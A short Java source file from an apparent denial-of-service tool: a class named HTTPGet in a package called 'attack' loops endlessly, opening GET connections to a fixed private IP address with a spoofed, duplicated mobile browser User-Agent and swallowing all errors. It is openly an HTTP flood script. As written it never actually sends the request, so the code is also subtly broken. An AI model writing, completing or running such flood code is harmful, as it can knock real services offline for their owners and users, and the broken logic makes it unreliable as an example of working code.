package attack;

import utils.LoggingUtils;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

public class HTTPGet extends LoggingUtils implements Runnable {

    public void run() {

        try {

            while (true) {

                final URL obj = new URL("http://192.168.1.252");
                final HttpURLConnection httpURLConnection = (HttpURLConnection) obj.openConnection();
                httpURLConnection.setRequestMethod("GET");
                httpURLConnection.setRequestProperty("User-Agent", "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1");
            }
        } catch (final IOException ignored) {}
    }
}
